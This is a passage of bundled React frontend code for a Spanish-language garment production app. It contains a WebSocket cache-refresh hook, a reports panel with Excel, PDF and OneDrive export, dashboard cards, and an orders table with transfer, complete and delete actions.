      queryClient2.invalidateQueries({ queryKey: ["/api/notifications"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/dashboard/stats"] });
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/transfers/pending"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
      queryClient2.invalidateQueries({ queryKey: ["orders"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/users"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/almacen/repositions"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/admin/users"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/agenda"] });
      queryClient2.refetchQueries({ queryKey: ["repositions"] });
      queryClient2.refetchQueries({ queryKey: ["/api/orders"] });
      queryClient2.refetchQueries({ queryKey: ["/api/almacen/repositions"] });
      queryClient2.refetchQueries({ queryKey: ["/api/dashboard/stats"] });
      if (notification && (notification.type?.includes("reposition") || notification.type?.includes("completion") || notification.type?.includes("order") || notification.type?.includes("transfer") || notification.type?.includes("user") || notification.type === "new_reposition" || notification.type === "reposition_transfer" || notification.type === "reposition_approved" || notification.type === "reposition_rejected" || notification.type === "reposition_completed" || notification.type === "reposition_deleted" || notification.type === "reposition_paused" || notification.type === "reposition_resumed" || notification.type === "completion_approval_needed")) {
        console.log("Actualizando datos en tiempo real para todos los usuarios:", notification);
      }
    };
    webSocketManager.addListener(notificationListener);
    return () => {
      webSocketManager.removeListener(notificationListener);
      setIsConnected(false);
    };
  }, [queryClient2]);
  const sendMessage = (message2) => {
    webSocketManagerRef.current?.sendMessage(message2);
  };
  const onMessage = (callback) => {
    if (webSocketManagerRef.current) {
      webSocketManagerRef.current.addListener(callback);
    }
  };
  return { isConnected, sendMessage, onMessage };
}

// client/src/components/reports/ReportsPanel.tsx
import { useState as useState24 } from "react";
import { jsx as jsx37, jsxs as jsxs13 } from "react/jsx-runtime";
function ReportsPanel({ open, onClose }) {
  const { toast: toast2 } = useToast();
  const [reportType, setReportType] = useState24("");
  const [dateRange, setDateRange] = useState24({
    startDate: "",
    endDate: ""
  });
  const [filters, setFilters] = useState24({
    area: "",
    status: "",
    urgency: ""
  });
  const [isGenerating, setIsGenerating] = useState24(false);
  const { data: reportData } = useQuery({
    queryKey: ["/api/reports/data", reportType, dateRange, filters],
    enabled: !!reportType && open,
    queryFn: async () => {
      const params = new URLSearchParams({
        type: reportType,
        startDate: dateRange.startDate,
        endDate: dateRange.endDate,
        area: filters.area,
        status: filters.status,
        urgency: filters.urgency
      });
      const response = await apiRequest("GET", `/api/reports/data?${params}`);
      return response.json();
    }
  });
  const handleGenerateReport = async (format2) => {
    if (!reportType) {
      toast2({
        title: "Error",
        description: "Selecciona un tipo de reporte",
        variant: "destructive"
      });
      return;
    }
    setIsGenerating(true);
    try {
      const params = new URLSearchParams({
        type: reportType,
        format: format2,
        startDate: dateRange.startDate,
        endDate: dateRange.endDate,
        area: filters.area,
        status: filters.status,
        urgency: filters.urgency
      });
      const response = await apiRequest("GET", `/api/reports/generate?${params}`);
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `reporte-${reportType}-${(/* @__PURE__ */ new Date()).toISOString().split("T")[0]}.${format2 === "excel" ? "xlsx" : "pdf"}`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
      toast2({
        title: "Reporte generado",
        description: "El reporte se ha descargado exitosamente"
      });
    } catch (error) {
      toast2({
        title: "Error",
        description: "Error al generar el reporte",
        variant: "destructive"
      });
    } finally {
      setIsGenerating(false);
    }
  };
  const handleSaveToOneDrive = async () => {
    if (!reportType) {
      toast2({
        title: "Error",
        description: "Selecciona un tipo de reporte",
        variant: "destructive"
      });
      return;
    }
    setIsGenerating(true);
    try {
      const params = new URLSearchParams({
        type: reportType,
        startDate: dateRange.startDate,
        endDate: dateRange.endDate,
        area: filters.area,
        status: filters.status,
        urgency: filters.urgency
      });
      const response = await apiRequest("POST", `/api/reports/onedrive?${params}`);
      const result = await response.json();
      toast2({
        title: "Guardado en OneDrive",
        description: `Reporte guardado exitosamente: ${result.fileName}`
      });
    } catch (error) {
      toast2({
        title: "Error",
        description: "Error al guardar en OneDrive",
        variant: "destructive"
      });
    } finally {
      setIsGenerating(false);
    }
  };
  const reportTypes = [
    { value: "repositions", label: "Reporte de Reposiciones" },
    { value: "orders", label: "Reporte de \xD3rdenes" },
    { value: "transfers", label: "Reporte de Transferencias" },
    { value: "productivity", label: "Reporte de Productividad" }
  ];
  const areas3 = [
    { value: "", label: "Todas las \xE1reas" },
    { value: "patronaje", label: "Patronaje" },
    { value: "corte", label: "Corte" },
    { value: "bordado", label: "Bordado" },
    { value: "ensamble", label: "Ensamble" },
    { value: "plancha", label: "Plancha" },
    { value: "calidad", label: "Calidad" },
    { value: "operaciones", label: "Operaciones" }
  ];
  return /* @__PURE__ */ jsx37(Sheet, { open, onOpenChange: onClose, children: /* @__PURE__ */ jsxs13(SheetContent, { className: "w-96 max-w-full", children: [
    /* @__PURE__ */ jsx37(SheetHeader, { children: /* @__PURE__ */ jsxs13(SheetTitle, { className: "flex items-center gap-2", children: [
      /* @__PURE__ */ jsx37(ChartColumn, { className: "text-blue-600", size: 20 }),
      "Generador de Reportes"
    ] }) }),
    /* @__PURE__ */ jsxs13("div", { className: "mt-6 space-y-6", children: [
      /* @__PURE__ */ jsxs13("div", { children: [
        /* @__PURE__ */ jsx37(Label2, { children: "Tipo de Reporte" }),
        /* @__PURE__ */ jsxs13(Select2, { value: reportType, onValueChange: setReportType, children: [
          /* @__PURE__ */ jsx37(SelectTrigger2, { children: /* @__PURE__ */ jsx37(SelectValue2, { placeholder: "Selecciona un tipo de reporte" }) }),
          /* @__PURE__ */ jsx37(SelectContent2, { children: reportTypes.map((type) => /* @__PURE__ */ jsx37(SelectItem2, { value: type.value, children: type.label }, type.value)) })
        ] })
      ] }),
      /* @__PURE__ */ jsxs13("div", { className: "grid grid-cols-2 gap-4", children: [
        /* @__PURE__ */ jsxs13("div", { children: [
          /* @__PURE__ */ jsx37(Label2, { children: "Fecha Inicio" }),
          /* @__PURE__ */ jsx37(
            Input,
            {
              type: "date",
              value: dateRange.startDate,
              onChange: (e) => setDateRange((prev) => ({ ...prev, startDate: e.target.value }))
            }
          )
        ] }),
        /* @__PURE__ */ jsxs13("div", { children: [
          /* @__PURE__ */ jsx37(Label2, { children: "Fecha Fin" }),
          /* @__PURE__ */ jsx37(
            Input,
            {
              type: "date",
              value: dateRange.endDate,
              onChange: (e) => setDateRange((prev) => ({ ...prev, endDate: e.target.value }))
            }
          )
        ] })
      ] }),
      /* @__PURE__ */ jsxs13("div", { className: "space-y-4", children: [
        /* @__PURE__ */ jsxs13("div", { className: "flex items-center gap-2", children: [
          /* @__PURE__ */ jsx37(Filter, { size: 16 }),
          /* @__PURE__ */ jsx37(Label2, { children: "Filtros" })
        ] }),
        /* @__PURE__ */ jsxs13("div", { children: [
          /* @__PURE__ */ jsx37(Label2, { children: "\xC1rea" }),
          /* @__PURE__ */ jsxs13(Select2, { value: filters.area, onValueChange: (value) => setFilters((prev) => ({ ...prev, area: value })), children: [
            /* @__PURE__ */ jsx37(SelectTrigger2, { children: /* @__PURE__ */ jsx37(SelectValue2, { placeholder: "Filtrar por \xE1rea" }) }),
            /* @__PURE__ */ jsx37(SelectContent2, { children: areas3.map((area) => /* @__PURE__ */ jsx37(SelectItem2, { value: area.value, children: area.label }, area.value)) })
          ] })
        ] })
      ] }),
      reportData && /* @__PURE__ */ jsxs13(Card, { children: [
        /* @__PURE__ */ jsx37(CardHeader, { children: /* @__PURE__ */ jsx37(CardTitle, { className: "text-sm", children: "Vista Previa" }) }),
        /* @__PURE__ */ jsx37(CardContent, { children: /* @__PURE__ */ jsxs13("div", { className: "space-y-2", children: [
          /* @__PURE__ */ jsxs13("div", { className: "flex justify-between text-sm", children: [
            /* @__PURE__ */ jsx37("span", { children: "Total de registros:" }),
            /* @__PURE__ */ jsx37(Badge, { variant: "outline", children: reportData.total || 0 })
          ] }),
          reportData.summary && Object.entries(reportData.summary).map(([key, value]) => /* @__PURE__ */ jsxs13("div", { className: "flex justify-between text-sm", children: [
            /* @__PURE__ */ jsxs13("span", { children: [
              key,
              ":"
            ] }),
            /* @__PURE__ */ jsx37(Badge, { variant: "outline", children: value })
          ] }, key))
        ] }) })
      ] }),
      /* @__PURE__ */ jsxs13("div", { className: "space-y-3", children: [
        /* @__PURE__ */ jsxs13("div", { className: "flex gap-2", children: [
          /* @__PURE__ */ jsxs13(
            Button,
            {
              onClick: () => handleGenerateReport("excel"),
              disabled: isGenerating,
              className: "flex-1",
              children: [
                /* @__PURE__ */ jsx37(FileText, { className: "w-4 h-4 mr-2" }),
                "Excel"
              ]
            }
          ),
          /* @__PURE__ */ jsxs13(
            Button,
            {
              onClick: () => handleGenerateReport("pdf"),
              disabled: isGenerating,
              variant: "outline",
              className: "flex-1",
              children: [
                /* @__PURE__ */ jsx37(Download, { className: "w-4 h-4 mr-2" }),
                "PDF"
              ]
            }
          )
        ] }),
        /* @__PURE__ */ jsxs13(
          Button,
          {
            onClick: handleSaveToOneDrive,
            disabled: isGenerating,
            className: "w-full bg-blue-600 hover:bg-blue-700",
            children: [
              /* @__PURE__ */ jsx37(Calendar, { className: "w-4 h-4 mr-2" }),
              "Guardar en OneDrive"
            ]
          }
        )
      ] })
    ] })
  ] }) });
}

// client/src/components/layout/layout.tsx
import { jsx as jsx38, jsxs as jsxs14 } from "react/jsx-runtime";
function Layout({ children }) {
  const { user } = useAuth();
  const [showCreateOrder, setShowCreateOrder] = useState25(false);
  const [showNotifications, setShowNotifications] = useState25(false);
  const [showReports, setShowReports] = useState25(false);
  useWebSocket();
  const canCreateOrders = user?.area === "corte" || user?.area === "admin";
  return /* @__PURE__ */ jsxs14("div", { className: "min-h-screen flex bg-gray-50", children: [
    /* @__PURE__ */ jsx38(
      Sidebar,
      {
        onShowNotifications: () => setShowNotifications(true),
        onCreateOrder: () => setShowCreateOrder(true),
        onReportsClick: () => setShowReports(true)
      }
    ),
    /* @__PURE__ */ jsx38("main", { className: "flex-1 ml-64 p-6 overflow-y-auto", children }),
    showCreateOrder && canCreateOrders && /* @__PURE__ */ jsx38(
      CreateOrderModal,
      {
        open: showCreateOrder,
        onClose: () => setShowCreateOrder(false)
      }
    ),
    /* @__PURE__ */ jsx38(
      NotificationsPanel,
      {
        open: showNotifications,
        onClose: () => setShowNotifications(false)
      }
    ),
    /* @__PURE__ */ jsx38(
      ReportsPanel,
      {
        open: showReports,
        onClose: () => setShowReports(false)
      }
    )
  ] });
}

// client/src/components/dashboard/stats-cards.tsx
import { jsx as jsx39, jsxs as jsxs15 } from "react/jsx-runtime";
function StatsCards() {
  const { data: stats, isLoading } = useQuery({
    queryKey: ["/api/dashboard/stats"]
  });
  if (isLoading) {
    return /* @__PURE__ */ jsx39("div", { className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-6", children: [...Array(4)].map((_, i) => /* @__PURE__ */ jsx39(Card, { className: "animate-pulse", children: /* @__PURE__ */ jsx39(CardContent, { className: "p-6", children: /* @__PURE__ */ jsx39("div", { className: "h-16 bg-gray-200 rounded" }) }) }, i)) });
  }
  const statsData = [
    {
      title: "Pedidos Activos",
      value: stats?.activeOrders || 0,
      icon: Package,
      bgColor: "bg-[#f2f2f2]",
      iconColor: "text-primary"
    },
    {
      title: "En Mi \xC1rea",
      value: stats?.myAreaOrders || 0,
      icon: LayoutGrid,
      bgColor: "bg-green-100",
      iconColor: "text-green-600"
    },
    {
      title: "Pendientes",
      value: stats?.pendingTransfers || 0,
      icon: Hourglass,
      bgColor: "bg-yellow-100",
      iconColor: "text-yellow-600"
    },
    {
      title: "Finalizados Hoy",
      value: stats?.completedToday || 0,
      icon: BadgeCheck,
      bgColor: "bg-blue-100",
      iconColor: "text-blue-600"
    }
  ];
  return /* @__PURE__ */ jsx39("div", { className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-6", children: statsData.map((stat, index2) => /* @__PURE__ */ jsx39(Card, { children: /* @__PURE__ */ jsx39(CardContent, { className: "p-6", children: /* @__PURE__ */ jsxs15("div", { className: "flex items-center justify-between", children: [
    /* @__PURE__ */ jsxs15("div", { children: [
      /* @__PURE__ */ jsx39("p", { className: "text-sm font-medium text-gray-600", children: stat.title }),
      /* @__PURE__ */ jsx39("p", { className: "text-2xl font-bold text-gray-900", children: stat.value })
    ] }),
    /* @__PURE__ */ jsx39("div", { className: `w-12 h-12 ${stat.bgColor} rounded-lg flex items-center justify-center`, children: /* @__PURE__ */ jsx39(stat.icon, { className: `${stat.iconColor} text-xl`, size: 24 }) })
  ] }) }) }, index2)) });
}

// client/src/components/dashboard/recent-activity.tsx
import { jsx as jsx40, jsxs as jsxs16 } from "react/jsx-runtime";
function RecentActivity() {
  const { data: activity } = useQuery({
    queryKey: ["/api/dashboard/recent-activity"],
    queryFn: async () => {
      const response = await fetch("/api/dashboard/recent-activity");
      if (!response.ok) throw new Error("Failed to fetch recent activity");
      return response.json();
    }
  });
  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString("es-ES", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "America/Mexico_City"
    });
  };
  return /* @__PURE__ */ jsxs16("div", { className: "grid gap-6 md:grid-cols-2", children: [
    /* @__PURE__ */ jsxs16(Card, { children: [
      /* @__PURE__ */ jsx40(CardHeader, { children: /* @__PURE__ */ jsxs16(CardTitle, { className: "flex items-center gap-2", children: [
        /* @__PURE__ */ jsx40(Package, { className: "w-5 h-5 text-blue-600" }),
        "Pedidos Recientes"
      ] }) }),
      /* @__PURE__ */ jsx40(CardContent, { children: /* @__PURE__ */ jsx40("div", { className: "space-y-4", children: activity?.orders?.length > 0 ? activity.orders.map((order) => /* @__PURE__ */ jsxs16("div", { className: "flex items-center justify-between p-3 bg-gray-50 rounded-lg", children: [
        /* @__PURE__ */ jsxs16("div", { children: [
          /* @__PURE__ */ jsx40("p", { className: "font-medium text-sm", children: order.folio }),
          /* @__PURE__ */ jsx40("p", { className: "text-xs text-gray-600", children: order.cliente }),
          /* @__PURE__ */ jsxs16("p", { className: "text-xs text-gray-500 flex items-center gap-1", children: [
            /* @__PURE__ */ jsx40(Clock, { className: "w-3 h-3" }),
            formatDate(order.createdAt)
          ] })
        ] }),
        /* @__PURE__ */ jsxs16("div", { className: "text-right", children: [
          /* @__PURE__ */ jsx40(Badge, { variant: order.status === "active" ? "default" : "secondary", children: order.status }),
          /* @__PURE__ */ jsx40("p", { className: "text-xs text-gray-600 mt-1", children: order.currentArea })
        ] })
      ] }, order.id)) : /* @__PURE__ */ jsx40("p", { className: "text-gray-500 text-center py-4", children: "No hay pedidos recientes" }) }) })
    ] }),
    /* @__PURE__ */ jsxs16(Card, { children: [
      /* @__PURE__ */ jsx40(CardHeader, { children: /* @__PURE__ */ jsxs16(CardTitle, { className: "flex items-center gap-2", children: [
        /* @__PURE__ */ jsx40(Settings, { className: "w-5 h-5 text-purple-600" }),
        "Reposiciones Recientes"
      ] }) }),
      /* @__PURE__ */ jsx40(CardContent, { children: /* @__PURE__ */ jsx40("div", { className: "space-y-4", children: activity?.repositions?.length > 0 ? activity.repositions.map((reposition) => /* @__PURE__ */ jsxs16("div", { className: "flex items-center justify-between p-3 bg-gray-50 rounded-lg", children: [
        /* @__PURE__ */ jsxs16("div", { children: [
          /* @__PURE__ */ jsx40("p", { className: "font-medium text-sm", children: reposition.folio }),
          /* @__PURE__ */ jsx40("p", { className: "text-xs text-gray-600", children: reposition.type }),
          /* @__PURE__ */ jsxs16("p", { className: "text-xs text-gray-500 flex items-center gap-1", children: [
            /* @__PURE__ */ jsx40(Clock, { className: "w-3 h-3" }),
            formatDate(reposition.createdAt)
          ] })
        ] }),
        /* @__PURE__ */ jsxs16("div", { className: "text-right", children: [
          /* @__PURE__ */ jsx40(Badge, { variant: reposition.status === "pendiente" ? "secondary" : "default", children: reposition.status }),
          /* @__PURE__ */ jsx40("p", { className: "text-xs text-gray-600 mt-1", children: reposition.currentArea })
        ] })
      ] }, reposition.id)) : /* @__PURE__ */ jsx40("p", { className: "text-gray-500 text-center py-4", children: "No hay reposiciones recientes" }) }) })
    ] })
  ] });
}

// client/src/components/orders/orders-table.tsx
import { useState as useState26 } from "react";

// client/src/components/ui/table.tsx
import * as React56 from "react";
import { jsx as jsx41 } from "react/jsx-runtime";
var Table = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41("div", { className: "relative w-full overflow-auto", children: /* @__PURE__ */ jsx41(
  "table",
  {
    ref,
    className: cn("w-full caption-bottom text-sm", className),
    ...props
  }
) }));
Table.displayName = "Table";
var TableHeader = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41("thead", { ref, className: cn("[&_tr]:border-b", className), ...props }));
TableHeader.displayName = "TableHeader";
var TableBody = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41(
  "tbody",
  {
    ref,
    className: cn("[&_tr:last-child]:border-0", className),
    ...props
  }
));
TableBody.displayName = "TableBody";
var TableFooter = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41(
  "tfoot",
  {
    ref,
    className: cn(
      "border-t bg-muted/50 font-medium [&>tr]:last:border-b-0",
      className
    ),
    ...props
  }
));
TableFooter.displayName = "TableFooter";
var TableRow = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41(
  "tr",
  {
    ref,
    className: cn(
      "border-b transition-colors hover:bg-muted/50 data-[state=selected]:bg-muted",
      className
    ),
    ...props
  }
));
TableRow.displayName = "TableRow";
var TableHead = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41(
  "th",
  {
    ref,
    className: cn(
      "h-12 px-4 text-left align-middle font-medium text-muted-foreground [&:has([role=checkbox])]:pr-0",
      className
    ),
    ...props
  }
));
TableHead.displayName = "TableHead";
var TableCell = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41(
  "td",
  {
    ref,
    className: cn("p-4 align-middle [&:has([role=checkbox])]:pr-0", className),
    ...props
  }
));
TableCell.displayName = "TableCell";
var TableCaption = React56.forwardRef(({ className, ...props }, ref) => /* @__PURE__ */ jsx41(
  "caption",
  {
    ref,
    className: cn("mt-4 text-sm text-muted-foreground", className),
    ...props
  }
));
TableCaption.displayName = "TableCaption";

// client/src/components/orders/orders-table.tsx
var import_sweetalert23 = __toESM(require_sweetalert2_all(), 1);
import { jsx as jsx42, jsxs as jsxs17 } from "react/jsx-runtime";
function OrdersTable({ searchTerm, onTransferOrder, onViewHistory, onViewDetails }) {
  const { user } = useAuth();
  const { toast: toast2 } = useToast();
  const queryClient2 = useQueryClient();
  const [areaFilter, setAreaFilter] = useState26("all");
  const [statusFilter, setStatusFilter] = useState26("all");
  const trashIconSvg = `
<svg xmlns="http://www.w3.org/2000/svg" class="animate-bounce text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="48" height="48">
  <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
</svg>
`;
  const { data: orders = [], isLoading, error, refetch } = useQuery({
    queryKey: ["/api/orders"],
    queryFn: async () => {
      const response = await apiRequest("GET", "/api/orders");
      return response.json();
    },
    refetchInterval: 5e3,
    // Refetch every 5 seconds
    refetchOnMount: true,
    refetchOnWindowFocus: true
  });
  const completeOrderMutation = useMutation({
    mutationFn: async (orderId) => {
      const res = await apiRequest("POST", `/api/orders/${orderId}/complete`);
      return await res.json();
    },
    onSuccess: () => {
      import_sweetalert23.default.fire({
        title: "\xA1Pedido finalizado!",
        text: "El pedido ha sido marcado como completado exitosamente.",
        icon: "success",
        confirmButtonText: "Aceptar",
        customClass: {
          popup: "font-sans"
        },
        backdrop: `
      rgba(0,0,123,0.4)
      url("https://sweetalert2.github.io/images/nyan-cat.gif")
      left top
      no-repeat
    `,
        timer: 2500,
        timerProgressBar: true,
        showClass: {
          popup: "animate__animated animate__fadeInDown"
        },
        hideClass: {
          popup: "animate__animated animate__fadeOutUp"
        }
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/dashboard/stats"] });
    },
    onError: (error2) => {
      toast2({
        title: "Error al finalizar pedido",
        description: error2.message,
        variant: "destructive"
      });
    }
  });
  const deleteOrderMutation = useMutation({
    mutationFn: async (orderId) => {
      const res = await apiRequest("DELETE", `/api/orders/${orderId}`);
      if (!res.ok) {
        const errorText = await res.text();
        throw new Error(`Error ${res.status}: ${errorText}`);
      }
      const contentType = res.headers.get("content-type") || "";
      if (contentType.includes("application/json")) {
        return await res.json();
      }
      return null;
    },
    onSuccess: () => {
      import_sweetalert23.default.fire({
        title: "Pedido eliminado",
        html: `
            <div class="flex flex-col items-center space-y-4">
              ${trashIconSvg}
              <p>El pedido ha sido eliminado permanentemente</p>
            </div>
          `,
        icon: void 0,
        showConfirmButton: true,
        confirmButtonText: "Aceptar",
        timer: 2500,
        customClass: {
          popup: "font-sans"
        }
      });
      queryClient2.invalidateQueries({ queryKey: ["/api/orders"] });
      queryClient2.invalidateQueries({ queryKey: ["/api/dashboard/stats"] });
    },
    onError: (error2) => {
      toast2({
        title: "Error al eliminar pedido",
        description: error2.message,
        variant: "destructive"
      });
    }
  });
  const getAreaBadgeColor = (area) => {
    const colors = {
      corte: "bg-green-100 text-green-800",
      bordado: "bg-blue-100 text-blue-800",
      ensamble: "bg-purple-100 text-purple-800",
      plancha: "bg-orange-100 text-orange-800",
      calidad: "bg-pink-100 text-pink-800",
      envios: "bg-purple-100 text-purple-800",
      almacen: "bg-indigo-100 text-indigo-800",
      admin: "bg-gray-100 text-gray-800"
    };
    return colors[area] || "bg-gray-100 text-gray-800";
  };
  const getStatusBadgeColor = (status) => {
    return status === "completed" ? "bg-green-100 text-green-800" : "bg-yellow-100 text-yellow-800";
  };
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      almacen: "Almac\xE9n",
      admin: "Admin"
    };
    return names[area] || area;
  };
  const filteredOrders = orders.filter((order) => {
    const matchesSearch = searchTerm === "" || order.folio.toLowerCase().includes(searchTerm.toLowerCase()) || order.clienteHotel.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesArea = areaFilter === "all" || order.currentArea === areaFilter;
    const matchesStatus = statusFilter === "all" || order.status === statusFilter;
    return matchesSearch && matchesArea && matchesStatus;
  });
  if (isLoading) {
    return /* @__PURE__ */ jsx42(Card, { children: /* @__PURE__ */ jsx42(CardContent, { className: "p-6", children: /* @__PURE__ */ jsx42("div", { className: "animate-pulse space-y-4", children: [...Array(5)].map((_, i) => /* @__PURE__ */ jsx42("div", { className: "h-16 bg-gray-200 rounded" }, i)) }) }) });
  }
  return /* @__PURE__ */ jsxs17(Card, { children: [
    /* @__PURE__ */ jsx42(CardHeader, { children: /* @__PURE__ */ jsxs17("div", { className: "flex justify-between items-center", children: [
      /* @__PURE__ */ jsx42(CardTitle, { children: "Pedidos Recientes" }),
      /* @__PURE__ */ jsxs17("div", { className: "flex space-x-2", children: [
        /* @__PURE__ */ jsxs17(Select2, { value: areaFilter, onValueChange: setAreaFilter, children: [
          /* @__PURE__ */ jsx42(SelectTrigger2, { className: "w-40", children: /* @__PURE__ */ jsx42(SelectValue2, {}) }),
          /* @__PURE__ */ jsxs17(SelectContent2, { children: [
            /* @__PURE__ */ jsx42(SelectItem2, { value: "all", children: "Todas las \xC1reas" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "corte", children: "Corte" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "bordado", children: "Bordado" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "ensamble", children: "Ensamble" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "plancha", children: "Plancha/Empaque" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "calidad", children: "Calidad" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "envios", children: "Env\xEDos" })
          ] })
        ] }),
        /* @__PURE__ */ jsxs17(Select2, { value: statusFilter, onValueChange: setStatusFilter, children: [
          /* @__PURE__ */ jsx42(SelectTrigger2, { className: "w-40", children: /* @__PURE__ */ jsx42(SelectValue2, {}) }),
          /* @__PURE__ */ jsxs17(SelectContent2, { children: [
            /* @__PURE__ */ jsx42(SelectItem2, { value: "all", children: "Todos los Estados" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "active", children: "Activos" }),
            /* @__PURE__ */ jsx42(SelectItem2, { value: "completed", children: "Finalizados" })
          ] })
        ] })
      ] })
    ] }) }),
    /* @__PURE__ */ jsx42(CardContent, { children: /* @__PURE__ */ jsx42("div", { className: "overflow-x-auto", children: /* @__PURE__ */ jsxs17(Table, { children: [
      /* @__PURE__ */ jsx42(TableHeader, { children: /* @__PURE__ */ jsxs17(TableRow, { children: [
        /* @__PURE__ */ jsx42(TableHead, { children: "Folio" }),
        /* @__PURE__ */ jsx42(TableHead, { children: "Cliente/Hotel" }),
        /* @__PURE__ */ jsx42(TableHead, { children: "Modelo" }),
        /* @__PURE__ */ jsx42(TableHead, { children: "\xC1rea Actual" }),
        /* @__PURE__ */ jsx42(TableHead, { children: "Piezas" }),
        /* @__PURE__ */ jsx42(TableHead, { children: "Estado" }),
        /* @__PURE__ */ jsx42(TableHead, { children: "Acciones" })
      ] }) }),
      /* @__PURE__ */ jsx42(TableBody, { children: filteredOrders.map((order) => /* @__PURE__ */ jsxs17(TableRow, { children: [
        /* @__PURE__ */ jsxs17(TableCell, { children: [
          /* @__PURE__ */ jsx42("div", { className: "font-medium", children: order.folio }),
          /* @__PURE__ */ jsx42("div", { className: "text-sm text-gray-500", children: order.noSolicitud })
        ] }),
        /* @__PURE__ */ jsx42(TableCell, { children: order.clienteHotel }),
        /* @__PURE__ */ jsxs17(TableCell, { children: [
          /* @__PURE__ */ jsx42("div", { className: "font-medium", children: order.modelo }),
          /* @__PURE__ */ jsxs17("div", { className: "text-sm text-gray-500", children: [
            order.tipoPrenda,
            " - ",
            order.color
          ] })
        ] }),
        /* @__PURE__ */ jsx42(TableCell, { children: /* @__PURE__ */ jsx42(Badge, { className: getAreaBadgeColor(order.currentArea), children: getAreaDisplayName(order.currentArea) }) }),
        /* @__PURE__ */ jsx42(TableCell, { children: order.totalPiezas }),
        /* @__PURE__ */ jsx42(TableCell, { children: /* @__PURE__ */ jsx42(Badge, { className: getStatusBadgeColor(order.status), children: order.status === "completed" ? "Finalizado" : "En Proceso" }) }),
        /* @__PURE__ */ jsx42(TableCell, { children: /* @__PURE__ */ jsxs17("div", { className: "flex space-x-2", children: [
          /* @__PURE__ */ jsx42(
            Button,
            {
              variant: "ghost",
              size: "sm",
              onClick: () => onViewDetails(order.id),
              title: "Ver detalles",
              children: /* @__PURE__ */ jsx42(Eye, { className: "h-4 w-4" })
            }
          ),
          order.status === "active" && /* @__PURE__ */ jsx42(
            Button,
            {
              variant: "ghost",
              size: "sm",
              onClick: () => onTransferOrder(order.id),
              title: "Transferir",
              children: /* @__PURE__ */ jsx42(ArrowRight, { className: "h-4 w-4" })
            }
          ),
          user?.area === "envios" && order.status === "active" && /* @__PURE__ */ jsx42(
            Button,
            {
              variant: "ghost",
              size: "sm",
              onClick: () => completeOrderMutation.mutate(order.id),
              disabled: completeOrderMutation.isPending,
              title: "Finalizar pedido",
              className: "text-green-600 hover:text-green-700",
              children: /* @__PURE__ */ jsx42(CircleCheckBig, { className: "h-4 w-4" })
            }
          ),
          /* @__PURE__ */ jsx42(
            Button,
            {
              variant: "ghost",
              size: "sm",
              onClick: () => onViewHistory(order.id),
              title: "Ver historial",
              children: /* @__PURE__ */ jsx42(History, { className: "h-4 w-4" })
            }
          ),
          user?.area === "admin" && /* @__PURE__ */ jsx42(
            Button,
            {
              variant: "ghost",
              size: "sm",
              onClick: () => {
                import_sweetalert23.default.fire({
                  title: "\xBFEliminar pedido?",
                  text: "Esta acci\xF3n no se puede deshacer.",
                  icon: "warning",
                  showCancelButton: true,
                  confirmButtonText: "S\xED, eliminar",
                  cancelButtonText: "Cancelar",
                  confirmButtonColor: "#e3342f",
                  cancelButtonColor: "#6c757d",
                  customClass: {
                    popup: "font-sans"
                  }
                }).then((result) => {
                  if (result.isConfirmed) {
                    deleteOrderMutation.mutate(order.id);
                  }
                });
              },
              disabled: deleteOrderMutation.isPending,
              title: "Eliminar pedido",
              className: "text-red-600 hover:text-red-700",
              children: /* @__PURE__ */ jsx42(Trash2, { className: "h-4 w-4" })
            }
          )
        ] }) })
      ] }, order.id)) })
    ] }) }) })
  ] });
}

// client/src/components/orders/transfer-modal.tsx
import { useState as useState27 } from "react";

// client/src/components/ui/textarea.tsx
import * as React57 from "react";
import { jsx as jsx43 } from "react/jsx-runtime";
var Textarea = React57.forwardRef(({ className, ...props }, ref) => {
  return /* @__PURE__ */ jsx43(
    "textarea",
    {
      className: cn(
        "flex min-h-[80px] w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm",
        className
      ),
      ref,
      ...props
    }
  );
});
Textarea.displayName = "Textarea";

// client/src/components/orders/transfer-modal.tsx
var import_sweetalert24 = __toESM(require_sweetalert2_all(), 1);
